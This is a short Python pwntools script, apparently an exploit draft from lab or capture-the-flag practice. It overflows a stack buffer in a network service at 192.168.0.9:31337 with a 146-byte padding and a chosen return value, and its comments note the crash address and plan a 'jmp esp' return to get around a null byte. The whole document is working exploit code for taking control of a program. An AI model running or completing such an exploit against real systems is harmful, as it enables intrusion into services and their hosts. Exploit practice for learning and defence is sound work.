#!/usr/bin/env python3
from pwn import *
r = remote('192.168.0.9',31337)

# tried to go to 616d6261 -> amba -> cyclic_find(abma) = 146

ret_to = 0x00b019e4
buf = b""
buf+= b"A"*146
buf+= struct.pack("<I",0xBCDE)
buf+= b"\n"
r.send(buf)
resp = r.recv()
print(str(resp))

# crashes program attempting to execute at 45444342

# not going to be able to tell it to return to the 0x00... address of string because of the null.
# good advice in his thing about ret to jmp esp and that's good since esp changes anyway.
